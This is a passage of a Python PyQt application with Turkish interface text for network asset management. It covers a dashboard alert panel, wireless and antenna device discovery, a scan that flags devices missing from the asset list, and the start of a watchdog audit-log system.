                alert = self.create_alert_item(f"Cihazların %{pct}'si offline", "#e74c3c", "🔴")
                self.alerts_container.addWidget(alert)
            
            # Veri yoksa bilgi
            if total_assets == 0:
                alert = self.create_alert_item("Henüz varlık eklenmemiş", "#00d4ff", "ℹ️")
                self.alerts_container.addWidget(alert)
            elif self.alerts_container.count() == 0:
                alert = self.create_alert_item("Herhangi bir uyarı yok", "#00ff88", "✅")
                self.alerts_container.addWidget(alert)
            
            # Watchdog son olayları panelini güncelle
            self._refresh_watchdog_panel()

            # Son güncelleme
            self.last_update.setText(f"🕐 {datetime.now().strftime('%H:%M:%S')}")
            
        except Exception as e:
            print(f"Dashboard refresh error: {e}")
    
    def _refresh_watchdog_panel(self):
        """Dashboard'daki watchdog özet panelini günceller."""
        if not hasattr(self, 'watchdog_table'):
            return
        main = self.window()
        if not hasattr(main, 'watchdog_widget'):
            return
        audit = main.watchdog_widget.audit
        self.watchdog_table.setRowCount(0)
        for entry in audit.entries[:8]:   # Son 8 olay
            row = self.watchdog_table.rowCount()
            self.watchdog_table.insertRow(row)
            icon, label, color = AuditEvent.label(entry.event_type)
            cells = [entry.timestamp[-8:], entry.asset_name, f"{icon} {label}"]
            for ci, val in enumerate(cells):
                item = QTableWidgetItem(val)
                item.setForeground(QColor(color if ci == 2 else "#aaaaaa"))
                self.watchdog_table.setItem(row, ci, item)
            self.watchdog_table.setRowHeight(row, 22)
    
    def _open_watchdog_tab(self):
        """Watchdog sekmesine geç."""
        main = self.window()
        if hasattr(main, 'watchdog_widget') and hasattr(main, 'tabs'):
            main.tabs.setCurrentWidget(main.watchdog_widget)

    def start_scan(self):
        """Ağ taraması başlat"""
        try:
            main = self.window()
            if hasattr(main, 'tabs'):
                main.tabs.setCurrentIndex(1)  # Cihazlar sekmesi
        except:
            pass
    
    def add_asset(self):
        """Yeni varlık ekle"""
        try:
            main = self.window()
            if hasattr(main, 'org_widget'):
                main.tabs.setCurrentWidget(main.org_widget)
                QTimer.singleShot(100, main.org_widget.add_asset)
        except:
            pass
    
    def export_excel(self):
        """Excel'e aktar"""
        try:
            main = self.window()
            if hasattr(main, 'org_widget'):
                main.org_widget.export_excel()
        except:
            pass
    
    def ping_all(self):
        """Tüm varlıkları ping'le"""
        try:
            main = self.window()
            if hasattr(main, 'org_widget'):
                main.tabs.setCurrentWidget(main.org_widget)
                QTimer.singleShot(100, lambda: main.org_widget.ping_department(None))
        except:
            pass


class AntennaWidget(QWidget):
    """Anten Tespit ve Yönetim Arayüzü"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.devices = {}  # ip -> AntennaDevice
        self.scanner_thread = None
        self.setup_ui()
        
    def setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setSpacing(8)
        layout.setContentsMargins(8, 8, 8, 8)
        
        # Başlık
        title = QLabel("📡 Anten & Kablosuz Cihaz Tespiti")
        title.setStyleSheet("font-size:18px;font-weight:bold;color:#00ff88;")
        layout.addWidget(title)
        
        # Kontrol paneli
        ctrl_frame = QFrame()
        ctrl_frame.setStyleSheet("""
            QFrame{background:#16213e;border-radius:8px;padding:10px;}
            QLabel{color:#a0a0a0;}
            QLineEdit{background:#0a0a14;border:1px solid #0f3460;border-radius:4px;padding:6px;color:#fff;}
            QPushButton{background:qlineargradient(x1:0,y1:0,x2:0,y2:1,stop:0 #00d4ff,stop:1 #0099cc);
                       color:#000;font-weight:bold;border:none;border-radius:4px;padding:8px 16px;}
            QPushButton:hover{background:#00ff88;}
            QPushButton:disabled{background:#333;}
            QSpinBox{background:#0a0a14;border:1px solid #0f3460;border-radius:4px;padding:4px;color:#fff;}
        """)
        ctrl_layout = QVBoxLayout(ctrl_frame)
        
        # Üst satır - IP aralığı ve tarama butonu
        row1 = QHBoxLayout()
        row1.addWidget(QLabel("IP Aralığı:"))
        self.ip_input = QLineEdit()
        self.ip_input.setPlaceholderText("Ör: 10.248.63.1-254 (boş = sadece broadcast)")
        self.ip_input.setFixedWidth(250)
        row1.addWidget(self.ip_input)
        
        row1.addWidget(QLabel("Timeout:"))
        self.timeout_spin = QSpinBox()
        self.timeout_spin.setRange(1, 10)
        self.timeout_spin.setValue(2)
        self.timeout_spin.setSuffix(" sn")
        row1.addWidget(self.timeout_spin)
        
        self.scan_btn = QPushButton("📡 Tara")
        self.scan_btn.setFixedWidth(120)
        self.scan_btn.clicked.connect(self.toggle_scan)
        row1.addWidget(self.scan_btn)
        
        row1.addStretch()
        ctrl_layout.addLayout(row1)
        
        # Alt satır - protokol seçenekleri
        row2 = QHBoxLayout()
        row2.addWidget(QLabel("Protokoller:"))
        
        self.chk_ssdp = QCheckBox("SSDP")
        self.chk_ssdp.setChecked(True)
        self.chk_ssdp.setStyleSheet("QCheckBox{color:#00d4ff;}")
        row2.addWidget(self.chk_ssdp)
        
        self.chk_ubnt = QCheckBox("Ubiquiti")
        self.chk_ubnt.setChecked(True)
        self.chk_ubnt.setStyleSheet("QCheckBox{color:#00ff88;}")
        row2.addWidget(self.chk_ubnt)
        
        self.chk_mikrotik = QCheckBox("Mikrotik")
        self.chk_mikrotik.setChecked(True)
        self.chk_mikrotik.setStyleSheet("QCheckBox{color:#f39c12;}")
        row2.addWidget(self.chk_mikrotik)
        
        self.chk_tinax = QCheckBox("Tinax")
        self.chk_tinax.setChecked(True)
        self.chk_tinax.setStyleSheet("QCheckBox{color:#e74c3c;}")
        row2.addWidget(self.chk_tinax)
        
        self.chk_arp = QCheckBox("ARP Analizi")
        self.chk_arp.setChecked(True)
        self.chk_arp.setStyleSheet("QCheckBox{color:#9b59b6;}")
        row2.addWidget(self.chk_arp)
        
        row2.addStretch()
        
        # Toplam sayı
        self.count_label = QLabel("Bulunan: 0")
        self.count_label.setStyleSheet("color:#00ff88;font-weight:bold;")
        row2.addWidget(self.count_label)
        
        ctrl_layout.addLayout(row2)
        
        # Progress
        self.progress_label = QLabel("")
        self.progress_label.setStyleSheet("color:#00d4ff;")
        ctrl_layout.addWidget(self.progress_label)
        
        layout.addWidget(ctrl_frame)
        
        # Cihaz listesi
        self.table = QTableWidget()
        self.table.setColumnCount(10)
        self.table.setHorizontalHeaderLabels([
            "IP", "MAC", "Vendor", "Tip", "Model", "İsim", 
            "Firmware", "Uptime", "Protokol", "Son Görülme"
        ])
        self.table.setStyleSheet("""
            QTableWidget{background:#0a0a14;border:1px solid #0f3460;border-radius:6px;
                        gridline-color:#1a1a2e;color:#fff;}
            QTableWidget::item{padding:6px;border-bottom:1px solid #1a1a2e;}
            QTableWidget::item:selected{background:#0f3460;}
            QHeaderView::section{background:#16213e;color:#00d4ff;padding:8px;border:none;
                                border-right:1px solid #0f3460;font-weight:bold;}
        """)
        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
        self.table.horizontalHeader().setStretchLastSection(True)
        self.table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.table.customContextMenuRequested.connect(self.show_context_menu)
        self.table.verticalHeader().setVisible(False)
        self.table.setAlternatingRowColors(True)
        layout.addWidget(self.table)
        
        # Alt butonlar
        btn_layout = QHBoxLayout()
        
        export_btn = QPushButton("📄 CSV Export")
        export_btn.clicked.connect(self.export_csv)
        export_btn.setStyleSheet("""
            QPushButton{background:#0f3460;color:#fff;border:none;border-radius:4px;padding:8px 16px;}
            QPushButton:hover{background:#1a4a7a;}
        """)
        btn_layout.addWidget(export_btn)
        
        clear_btn = QPushButton("🗑️ Temizle")
        clear_btn.clicked.connect(self.clear_results)
        clear_btn.setStyleSheet("""
            QPushButton{background:#0f3460;color:#fff;border:none;border-radius:4px;padding:8px 16px;}
            QPushButton:hover{background:#1a4a7a;}
        """)
        btn_layout.addWidget(clear_btn)
        
        btn_layout.addStretch()
        
        # Web arayüzü aç butonu
        web_btn = QPushButton("🌐 Web Arayüzü")
        web_btn.clicked.connect(self.open_web_interface)
        web_btn.setStyleSheet("""
            QPushButton{background:#00d4ff;color:#000;font-weight:bold;border:none;border-radius:4px;padding:8px 16px;}
            QPushButton:hover{background:#00ff88;}
        """)
        btn_layout.addWidget(web_btn)
        
        layout.addLayout(btn_layout)
    
    def toggle_scan(self):
        if self.scanner_thread and self.scanner_thread.isRunning():
            self.scanner_thread.stop()
            self.scan_btn.setText("📡 Tara")
            self.progress_label.setText("⏹ Durduruldu")
        else:
            self.start_scan()
    
    def start_scan(self):
        ip_range = self.ip_input.text().strip()
        timeout = self.timeout_spin.value()
        
        self.scanner_thread = AntennaDiscoveryThread(ip_range, timeout)
        self.scanner_thread.device_found.connect(self.on_device_found)
        self.scanner_thread.progress.connect(self.on_progress)
        self.scanner_thread.finished_signal.connect(self.on_scan_complete)
        
        self.scan_btn.setText("⏹ Durdur")
        self.progress_label.setText("🔍 Tarama başlatılıyor...")
        self.scanner_thread.start()
    
    def on_device_found(self, device):
        if device.ip not in self.devices:
            self.devices[device.ip] = device
            self.add_device_to_table(device)
            self.count_label.setText(f"Bulunan: {len(self.devices)}")
    
    def add_device_to_table(self, device):
        row = self.table.rowCount()
        self.table.insertRow(row)
        
        # Tip ikonları
        type_icons = {
            "antenna": "📡", "bridge": "🌉", "ap": "📶", 
            "router": "🌐", "repeater": "🔁", "wireless": "📻",
            "unknown": "❓"
        }
        
        # Vendor renkleri
        vendor_colors = {
            "Ubiquiti": "#00ff88", "Mikrotik": "#f39c12", "Tinax": "#e74c3c",
            "Cisco": "#00d4ff", "Aruba": "#9b59b6", "Ruckus": "#1abc9c",
            "Cambium": "#3498db", "TP-Link": "#2ecc71", "Netgear": "#e67e22"
        }
        
        items = [
            device.ip,
            device.mac or "-",
            device.vendor or "-",
            f"{type_icons.get(device.device_type, '❓')} {device.device_type}",
            device.model or "-",
            device.name or "-",
            device.firmware or "-",
            device.uptime or "-",
            device.protocol,
            device.last_seen
        ]
        
        for col, text in enumerate(items):
            item = QTableWidgetItem(str(text))
            item.setFlags(item.flags() & ~Qt.ItemFlag.ItemIsEditable)
            
            # Vendor rengi
            if col == 2 and device.vendor:
                color = vendor_colors.get(device.vendor, "#fff")
                item.setForeground(QColor(color))
            
            # IP yeşil
            if col == 0:
                item.setForeground(QColor("#00ff88"))
            
            # Protokol rengi
            if col == 8:
                proto_colors = {"UBNT": "#00ff88", "MNDP": "#f39c12", 
                              "TINAX": "#e74c3c", "SSDP": "#00d4ff", 
                              "HTTP": "#9b59b6", "ARP": "#1abc9c"}
                item.setForeground(QColor(proto_colors.get(device.protocol, "#fff")))
            
            self.table.setItem(row, col, item)
    
    def on_progress(self, msg):
        self.progress_label.setText(msg)
    
    def on_scan_complete(self, count):
        self.scan_btn.setText("📡 Tara")
        self.progress_label.setText(f"✅ Tarama tamamlandı! {count} cihaz bulundu.")
    
    def show_context_menu(self, pos):
        row = self.table.rowAt(pos.y())
        if row < 0:
            return
        
        ip_item = self.table.item(row, 0)
        if not ip_item:
            return
        
        ip = ip_item.text()
        device = self.devices.get(ip)
        
        menu = QMenu(self)
        menu.setStyleSheet("""
            QMenu{background:#16213e;color:#fff;border:1px solid #0f3460;border-radius:4px;}
            QMenu::item{padding:8px 20px;}
            QMenu::item:selected{background:#0f3460;}
        """)
        
        # Web arayüzü
        web_action = menu.addAction("🌐 Web Arayüzü Aç")
        web_action.triggered.connect(lambda: self.open_device_web(ip))
        
        # Ping
        ping_action = menu.addAction("📶 Ping")
        ping_action.triggered.connect(lambda: self.ping_device(ip))
        
        menu.addSeparator()
        
        # Kopyala
        copy_ip = menu.addAction("📋 IP Kopyala")
        copy_ip.triggered.connect(lambda: QApplication.clipboard().setText(ip))
        
        if device and device.mac:
            copy_mac = menu.addAction("📋 MAC Kopyala")
            copy_mac.triggered.connect(lambda: QApplication.clipboard().setText(device.mac))
        
        menu.addSeparator()
        
        # Detaylar
        details_action = menu.addAction("🔍 Detaylar")
        details_action.triggered.connect(lambda: self.show_device_details(device))
        
        menu.exec(self.table.viewport().mapToGlobal(pos))
    
    def open_device_web(self, ip):
        import webbrowser
        # Önce HTTPS dene, sonra HTTP
        webbrowser.open(f"https://{ip}")
    
    def ping_device(self, ip):
        try:
            if platform.system() == "Windows":
                cmd = ["ping", "-n", "4", ip]
            else:
                cmd = ["ping", "-c", "4", ip]
            
            result = run_command(cmd, timeout=10)
            
            msg = QMessageBox(self)
            msg.setWindowTitle(f"Ping: {ip}")
            msg.setText(f"<pre>{result.stdout}</pre>")
            msg.setStyleSheet("QMessageBox{background:#16213e;} QLabel{color:#fff;}")
            msg.exec()
        except Exception as e:
            QMessageBox.warning(self, "Hata", str(e))
    
    def show_device_details(self, device):
        if not device:
            return
        
        details = f"""
<h2 style='color:#00ff88'>📡 {device.ip}</h2>
<table style='color:#fff;'>
<tr><td><b>MAC:</b></td><td>{device.mac or '-'}</td></tr>
<tr><td><b>Vendor:</b></td><td>{device.vendor or '-'}</td></tr>
<tr><td><b>Tip:</b></td><td>{device.device_type}</td></tr>
<tr><td><b>Model:</b></td><td>{device.model or '-'}</td></tr>
<tr><td><b>İsim:</b></td><td>{device.name or '-'}</td></tr>
<tr><td><b>Firmware:</b></td><td>{device.firmware or '-'}</td></tr>
<tr><td><b>Uptime:</b></td><td>{device.uptime or '-'}</td></tr>
<tr><td><b>Protokol:</b></td><td>{device.protocol}</td></tr>
<tr><td><b>Son Görülme:</b></td><td>{device.last_seen}</td></tr>
</table>
"""
        if device.raw_data:
            details += "<hr><h3>Ham Veri:</h3><pre style='color:#00d4ff;'>"
            for k, v in device.raw_data.items():
                details += f"{k}: {v}\n"
            details += "</pre>"
        
        msg = QMessageBox(self)
        msg.setWindowTitle(f"Cihaz Detayları: {device.ip}")
        msg.setWindowIcon(create_app_icon())
        msg.setText(details)
        msg.setStyleSheet("QMessageBox{background:#16213e;} QLabel{color:#fff;}")
        msg.exec()
    
    def open_web_interface(self):
        row = self.table.currentRow()
        if row < 0:
            QMessageBox.information(self, "Bilgi", "Lütfen bir cihaz seçin!")
            return
        
        ip_item = self.table.item(row, 0)
        if ip_item:
            self.open_device_web(ip_item.text())
    
    def export_csv(self):
        if not self.devices:
            QMessageBox.warning(self, "Uyarı", "Dışa aktarılacak veri yok!")
            return
        
        path, _ = QFileDialog.getSaveFileName(
            self, "CSV Kaydet",
            f"antenler_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
            "CSV (*.csv)"
        )
        
        if path:
            with open(path, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(["IP", "MAC", "Vendor", "Tip", "Model", "İsim", 
                               "Firmware", "Uptime", "Protokol", "Son Görülme"])
                for device in self.devices.values():
                    writer.writerow([
                        device.ip, device.mac, device.vendor, device.device_type,
                        device.model, device.name, device.firmware, device.uptime,
                        device.protocol, device.last_seen
                    ])
            QMessageBox.information(self, "Başarılı", f"Kaydedildi:\n{path}")
    
    def clear_results(self):
        self.devices.clear()
        self.table.setRowCount(0)
        self.count_label.setText("Bulunan: 0")
        self.progress_label.setText("")


class SecurityWidget(QWidget):
    """Basitleştirilmiş ve stabil güvenlik paneli"""
    def __init__(self,org=None,parent=None):
        super().__init__(parent)
        self.org=org
        self.scan_thread=None
        self.scan_results=[]
        self.setup_ui()
    
    def get_asset_macs(self):
        """Varlık listesindeki tüm MAC'leri dictionary olarak al"""
        macs={}
        if self.org:
            for asset in self.org.get_assets():
                if asset.mac_address:
                    macs[asset.mac_address.upper()]={'name':asset.name,'type':asset.asset_type,'location':asset.location,'ip':asset.ip_address}
        return macs
    
    def setup_ui(self):
        layout=QVBoxLayout(self)
        layout.setContentsMargins(10,10,10,10)
        layout.setSpacing(10)
        
        # Üst bar - Kontroller
        top_bar=QHBoxLayout()
        
        self.scan_btn=QPushButton("🔍 Ağı Tara")
        self.scan_btn.setMinimumHeight(40)
        self.scan_btn.setStyleSheet("""
            QPushButton{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #0f3460,stop:1 #16213e);
            color:#00ff88;padding:10px 30px;border:2px solid #00ff88;border-radius:8px;font-size:14px;font-weight:bold;}
            QPushButton:hover{background:#00ff88;color:#0a0a14;}
            QPushButton:disabled{background:#333;color:#666;border-color:#444;}
        """)
        self.scan_btn.clicked.connect(self.start_scan)
        top_bar.addWidget(self.scan_btn)
        
        self.progress=QProgressBar()
        self.progress.setTextVisible(True)
        self.progress.setFormat("%p% - %v/%m")
        self.progress.setStyleSheet("""
            QProgressBar{background:#1a1a2e;border:1px solid #0f3460;border-radius:6px;height:25px;text-align:center;color:white;}
            QProgressBar::chunk{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #00ff88,stop:1 #00d4ff);border-radius:5px;}
        """)
        self.progress.hide()
        top_bar.addWidget(self.progress)
        
        self.status_label=QLabel("🔍 Tarama için butona basın")
        self.status_label.setStyleSheet("color:#888;font-size:12px;")
        top_bar.addWidget(self.status_label)
        
        top_bar.addStretch()
        
        # İstatistikler
        self.stats_frame=QFrame()
        self.stats_frame.setStyleSheet("QFrame{background:#16213e;border-radius:8px;padding:5px;}")
        stats_layout=QHBoxLayout(self.stats_frame)
        stats_layout.setContentsMargins(15,8,15,8)
        
        self.total_label=QLabel("Toplam: 0")
        self.total_label.setStyleSheet("color:white;font-weight:bold;")
        stats_layout.addWidget(self.total_label)
        
        stats_layout.addWidget(QLabel("|"))
        
        self.known_label=QLabel("✅ Bilinen: 0")
        self.known_label.setStyleSheet("color:#00ff88;font-weight:bold;")
        stats_layout.addWidget(self.known_label)
        
        stats_layout.addWidget(QLabel("|"))
        
        self.unknown_label=QLabel("❓ Bilinmeyen: 0")
        self.unknown_label.setStyleSheet("color:#f39c12;font-weight:bold;")
        stats_layout.addWidget(self.unknown_label)
        
        top_bar.addWidget(self.stats_frame)
        
        layout.addLayout(top_bar)
        
        # Ana tablo
        self.table=QTableWidget()
        self.table.setColumnCount(7)
        self.table.setHorizontalHeaderLabels(["Durum","IP Adresi","MAC Adresi","Vendor","Varlık Adı","Konum","Tür"])
        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Interactive)
        self.table.horizontalHeader().setStretchLastSection(True)
        self.table.horizontalHeader().resizeSection(0,100)  # Durum
        self.table.horizontalHeader().resizeSection(1,120)  # IP
        self.table.horizontalHeader().resizeSection(2,150)  # MAC
        self.table.horizontalHeader().resizeSection(3,120)  # Vendor
        self.table.horizontalHeader().resizeSection(4,150)  # Varlık Adı
        self.table.horizontalHeader().resizeSection(5,120)  # Konum
        self.table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.table.setAlternatingRowColors(True)
        self.table.setSortingEnabled(True)
        self.table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.table.customContextMenuRequested.connect(self.show_context_menu)
        self.table.setStyleSheet("""
            QTableWidget{background:#0a0a14;border:1px solid #0f3460;border-radius:8px;gridline-color:#1a1a2e;}
            QTableWidget::item{padding:8px;border-bottom:1px solid #1a1a2e;}
            QTableWidget::item:selected{background:#0f3460;}
            QTableWidget::item:alternate{background:#0d0d1a;}
            QHeaderView::section{background:#16213e;color:white;padding:10px;border:none;border-bottom:2px solid #00ff88;font-weight:bold;}
        """)
        layout.addWidget(self.table)
        
        # Alt bar - Hızlı işlemler
        bottom_bar=QHBoxLayout()
        
        self.trust_all_btn=QPushButton("✅ Tüm Bilinmeyenleri Güvenilir Yap")
        self.trust_all_btn.clicked.connect(self.trust_all_unknown)
        self.trust_all_btn.setEnabled(False)
        bottom_bar.addWidget(self.trust_all_btn)
        
        bottom_bar.addStretch()
        
        help_label=QLabel("💡 Sağ tık ile cihazı varlık listesine ekleyebilir veya işaretleyebilirsiniz")
        help_label.setStyleSheet("color:#666;font-size:10px;")
        bottom_bar.addWidget(help_label)
        
        layout.addLayout(bottom_bar)
    
    def start_scan(self):
        """Taramayı başlat"""
        if self.scan_thread and self.scan_thread.isRunning():
            return
        
        self.scan_btn.setEnabled(False)
        self.scan_btn.setText("⏳ Taranıyor...")
        self.progress.setValue(0)
        self.progress.show()
        self.table.setRowCount(0)
        self.scan_results=[]
        
        self.scan_thread=SecurityScanThread(self.org)
        self.scan_thread.progress.connect(self.on_progress)
        self.scan_thread.device_found.connect(self.on_device_found)
        self.scan_thread.scan_finished.connect(self.on_scan_finished)
        self.scan_thread.start()
    
    def on_progress(self,current,total,status):
        """Tarama ilerlemesi"""
        self.progress.setMaximum(total)
        self.progress.setValue(current)
        self.status_label.setText(f"🔍 {status}")
    
    def on_device_found(self,device):
        """Cihaz bulunduğunda tabloya ekle"""
        row=self.table.rowCount()
        self.table.insertRow(row)
        
        # Durum
        status_item=QTableWidgetItem(device['status_text'])
        if device['status']=='asset':
            status_item.setForeground(QColor(0,255,136))
            status_item.setIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_DialogApplyButton))
        else:
            status_item.setForeground(QColor(241,196,15))
            status_item.setIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_MessageBoxQuestion))
        self.table.setItem(row,0,status_item)
        
        # IP - Gateway'i özel göster
        ip_item=QTableWidgetItem(device['ip'])
        if device['is_gateway']:
            ip_item.setText(f"🌐 {device['ip']}")
            ip_item.setForeground(QColor(0,212,255))
        self.table.setItem(row,1,ip_item)
        
        # MAC
        self.table.setItem(row,2,QTableWidgetItem(device['mac']))
        
        # Vendor
        vendor_item=QTableWidgetItem(device['vendor'] or "-")
        if device['vendor']:
            vendor_item.setForeground(QColor(150,150,200))
        self.table.setItem(row,3,vendor_item)
        
        # Varlık adı
        name_item=QTableWidgetItem(device['name'] or "-")
        if device['name']:
            name_item.setForeground(QColor(0,255,136))
            name_item.setFont(QFont("Segoe UI",9,QFont.Weight.Bold))
        self.table.setItem(row,4,name_item)
        
        # Konum
        self.table.setItem(row,5,QTableWidgetItem(device['location'] or "-"))
        
        # Tür
        type_text=device['device_type'] or "-"
        self.table.setItem(row,6,QTableWidgetItem(type_text))
        
        # Data olarak sakla
        self.table.item(row,0).setData(Qt.ItemDataRole.UserRole,device)
    
    def on_scan_finished(self,results):
        """Tarama tamamlandığında"""
        self.scan_results=results
        self.scan_btn.setEnabled(True)
        self.scan_btn.setText("🔍 Ağı Tara")
        self.progress.hide()
        
        # İstatistikleri güncelle
        total=len(results)
        known=len([r for r in results if r['status']=='asset'])
        unknown=total-known
        
        self.total_label.setText(f"Toplam: {total}")
        self.known_label.setText(f"✅ Bilinen: {known}")
        self.unknown_label.setText(f"❓ Bilinmeyen: {unknown}")
        
        self.trust_all_btn.setEnabled(unknown>0)
        
        if unknown>0:
            self.status_label.setText(f"⚠️ {unknown} bilinmeyen cihaz bulundu!")
            self.status_label.setStyleSheet("color:#f39c12;font-size:12px;font-weight:bold;")
        else:
            self.status_label.setText(f"✅ Tüm cihazlar varlık listesinde kayıtlı")
            self.status_label.setStyleSheet("color:#00ff88;font-size:12px;font-weight:bold;")
    
    def show_context_menu(self,pos):
        """Sağ tık menüsü"""
        row=self.table.rowAt(pos.y())
        if row<0:return
        
        device=self.table.item(row,0).data(Qt.ItemDataRole.UserRole)
        if not device:return
        
        menu=QMenu(self)
        menu.setStyleSheet("""
            QMenu{background:#1a1a2e;color:white;border:2px solid #00ff88;border-radius:10px;padding:8px;}
            QMenu::item{padding:12px 25px;border-radius:6px;font-size:12px;}
            QMenu::item:selected{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #00ff88,stop:1 #00d4ff);color:#0a0a14;}
            QMenu::separator{height:2px;background:#0f3460;margin:5px 15px;}
        """)
        
        # Başlık
        title=menu.addAction(f"📍 {device['ip']} - {device['mac'][:11]}...")
        title.setEnabled(False)
        menu.addSeparator()
        
        if device['status']=='asset':
            # Varlık bilgisi göster
            info=menu.addAction(f"🏷️ Varlık: {device['name']}")
            info.setEnabled(False)
            if device['location']:
                loc=menu.addAction(f"📍 Konum: {device['location']}")
                loc.setEnabled(False)
            menu.addSeparator()
        else:
            # Varlık listesine ekle
            add_asset=menu.addAction("➕ Varlık Listesine Ekle")
            add_asset.triggered.connect(lambda:self.add_to_assets(device))
            menu.addSeparator()
        
        # Kopyalama seçenekleri
        copy_ip=menu.addAction("📋 IP Kopyala")
        copy_ip.triggered.connect(lambda:QApplication.clipboard().setText(device['ip']))
        
        copy_mac=menu.addAction("📋 MAC Kopyala")
        copy_mac.triggered.connect(lambda:QApplication.clipboard().setText(device['mac']))
        
        menu.exec(self.table.viewport().mapToGlobal(pos))
    
    def add_to_assets(self,device):
        """Cihazı varlık listesine ekle"""
        if not self.org:
            QMessageBox.warning(self,"Uyarı","Varlık yöneticisi bulunamadı!")
            return
        
        # Birim kontrolü
        depts=self.org.get_departments()
        if not depts:
            QMessageBox.warning(self,"Uyarı","Önce bir birim eklemelisiniz!\nVarlıklar sekmesinden birim ekleyin.")
            return
        
        # Basit dialog
        dialog=QDialog(self)
        dialog.setWindowTitle(f"Varlık Ekle - {device['ip']}")
        dialog.setMinimumWidth(400)
        layout=QVBoxLayout(dialog)
        
        # Bilgiler
        info=QLabel(f"<b>IP:</b> {device['ip']}<br><b>MAC:</b> {device['mac']}<br><b>Vendor:</b> {device['vendor'] or 'Bilinmiyor'}")
        info.setStyleSheet("background:#16213e;padding:10px;border-radius:6px;")
        layout.addWidget(info)
        
        form=QFormLayout()
        
        name_input=QLineEdit(device['vendor'] or f"Cihaz-{device['ip'].split('.')[-1]}")
        name_input.setPlaceholderText("Cihaz adı...")
        form.addRow("Ad:",name_input)
        
        dept_combo=QComboBox()
        for dept in depts:
            dept_combo.addItem(f"🏢 {dept.name}",dept.id)
        form.addRow("Birim:",dept_combo)
        
        location_input=QLineEdit()
        location_input.setPlaceholderText("Oda, kat...")
        form.addRow("Konum:",location_input)
        
        type_combo=QComboBox()
        for atype in AssetType:
            cfg=ASSET_CONFIG[atype]
            type_combo.addItem(f"{cfg['icon']} {cfg['name']}",atype.value)
        # Varsayılan tür seç
        if device['device_type']:
            idx=type_combo.findData(device['device_type'])
            if idx>=0:type_combo.setCurrentIndex(idx)
        form.addRow("Tür:",type_combo)
        
        layout.addLayout(form)
        
        buttons=QDialogButtonBox(QDialogButtonBox.StandardButton.Ok|QDialogButtonBox.StandardButton.Cancel)
        buttons.accepted.connect(dialog.accept)
        buttons.rejected.connect(dialog.reject)
        layout.addWidget(buttons)
        
        if dialog.exec()==QDialog.DialogCode.Accepted:
            # Varlık oluştur
            asset_data={
                'name':name_input.text().strip() or f"Cihaz-{device['ip'].split('.')[-1]}",
                'asset_type':type_combo.currentData(),
                'department_id':dept_combo.currentData(),
                'hostname':'',
                'mac_address':device['mac'],
                'ip_address':device['ip'],
                'location':location_input.text().strip(),
                'model':'',
                'serial_number':'',
                'notes':f"Vendor: {device['vendor']}" if device['vendor'] else '',
                'is_critical':False
            }
            
            self.org.add_asset(asset_data)
            QMessageBox.information(self,"Başarılı",f"'{asset_data['name']}' varlık listesine eklendi!")
            
            # Tabloyu güncelle
            self.start_scan()
    
    def trust_all_unknown(self):
        """Tüm bilinmeyen cihazları varlık listesine ekle"""
        if not self.org:
            QMessageBox.warning(self,"Uyarı","Varlık yöneticisi bulunamadı!")
            return
        
        depts=self.org.get_departments()
        if not depts:
            QMessageBox.warning(self,"Uyarı","Önce bir birim eklemelisiniz!")
            return
        
        unknown=[r for r in self.scan_results if r['status']=='unknown']
        if not unknown:return
        
        reply=QMessageBox.question(self,"Onay",
            f"{len(unknown)} bilinmeyen cihaz varlık listesine eklenecek.\n\nDevam etmek istiyor musunuz?",
            QMessageBox.StandardButton.Yes|QMessageBox.StandardButton.No)
        
        if reply!=QMessageBox.StandardButton.Yes:return
        
        # Birim seç
        dept_id=depts[0].id
        
        count=0
        for device in unknown:
            asset_data={
                'name':device['vendor'] or f"Cihaz-{device['ip'].split('.')[-1]}",
                'asset_type':device['device_type'] or 'other',
                'department_id':dept_id,
                'hostname':'',
                'mac_address':device['mac'],
                'ip_address':device['ip'],
                'location':'',
                'model':'',
                'serial_number':'',
                'notes':f"Otomatik eklendi - Vendor: {device['vendor']}" if device['vendor'] else 'Otomatik eklendi',
                'is_critical':False
            }
            self.org.add_asset(asset_data)
            count+=1
        
        QMessageBox.information(self,"Başarılı",f"{count} cihaz varlık listesine eklendi!")
        self.start_scan()

# ═══════════════════════════════════════════════════════════════════════════════
# WATCHDOG + AUDIT LOG SİSTEMİ
# ─────────────────────────────────────────────────────────────────────────────
# AuditEntry   : tek bir olay kaydı
# AuditLog     : olay geçmişini JSON dosyasında yönetir
# WatchdogThread : arka planda periyodik tarama yapan QThread
# WatchdogWidget : kullanıcı arayüzü (sekme)
# ═══════════════════════════════════════════════════════════════════════════════

from dataclasses import dataclass, field as dc_field, asdict as dc_asdict

# ─── Olay türleri ─────────────────────────────────────────────────────────────
class AuditEvent:
    ONLINE          = "online"           # Varlık ağda görüldü
    OFFLINE         = "offline"          # Varlık ağdan düştü
    BACK_ONLINE     = "back_online"      # Tekrar çevrimiçi
    IP_CHANGED      = "ip_changed"       # IP adresi değişti
    HOSTNAME_CHANGED= "hostname_changed" # Hostname değişti
    CRITICAL_OFFLINE= "critical_offline" # KRİTİK varlık çevrimdışı
    NEW_UNKNOWN     = "new_unknown"      # Tanımlanmamış yeni cihaz
    WATCHDOG_START  = "watchdog_start"   # İzleme başladı
    WATCHDOG_STOP   = "watchdog_stop"    # İzleme durdu

    LABELS = {
        "online":           ("🟢", "Çevrimiçi",           "#00ff88"),
        "offline":          ("🔴", "Çevrimdışı",           "#e74c3c"),
        "back_online":      ("💚", "Tekrar Çevrimiçi",     "#2ecc71"),
        "ip_changed":       ("🔄", "IP Değişti",           "#f39c12"),
        "hostname_changed": ("🖥️",  "Hostname Değişti",    "#f1c40f"),
